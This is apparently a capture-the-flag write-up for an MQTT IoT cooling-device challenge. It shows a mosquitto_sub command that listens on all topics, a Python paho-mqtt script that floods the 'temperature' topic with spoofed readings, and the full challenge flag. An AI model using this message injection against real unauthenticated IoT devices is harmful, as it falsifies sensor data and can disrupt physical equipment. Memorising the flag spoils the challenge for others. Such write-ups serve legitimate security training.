
You have access to a cooling IoT cooling device running over mqtt protocol, the unit needs to maintain a cold temperature to run smoothly.

Remember a very high temperature can raise alerts.

have fun! ;)


Similar to part 1 connect to it using mosquito



```bash
mosquitto_sub -h 0.cloud.chals.io -p 24604 -t "#"

```

In this we need send continuous messages to  the device such as temperatures until we get the flag

i used the following python script

```python

import time
import paho.mqtt.client as mqtt

# MQTT connection details
broker = "0.cloud.chals.io"
port = 24604
topic = "temperature"  # Replace with the correct topic if needed

# Define the MQTT client
client = mqtt.Client()

# Callbacks for connection and publish status
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to MQTT broker!")
    else:
        print(f"Connection failed with code {rc}")

def on_publish(client, userdata, mid):
    print(f"Message {mid} published.")

# Assign callbacks
client.on_connect = on_connect
client.on_publish = on_publish

# Connect to the MQTT broker
client.connect(broker, port)

# Start the loop to process received messages
client.loop_start()

# Function to publish the temperature value
def publish_temperature(value):
    print(f"Publishing temperature: {value}°C")
    client.publish(topic, str(value))  # Publishing to the specified topic

# Main loop to send temperature values from 1 to 100 continuously with a 2-second delay
try:
    while True:
        for temperature_value in range(1, 101):
            publish_temperature(temperature_value)
            time.sleep(2)  # 2-second delay
except KeyboardInterrupt:
    print("Exiting...")
    client.disconnect()
    client.loop_stop()

```

Then I got the flag

![[Pasted image 20240811020439.png]]

the flag is:
```bash
KPMG_CTF{kSV_KLx9SrtPlASUcjIopYj2pqM6PxUkmKQLSGMOwWZhvaumzuMpOj-tf24mB0TKI6WbBpqdEXYu4jzovC5HofkhQr-BfloP7eKrABIV}
```

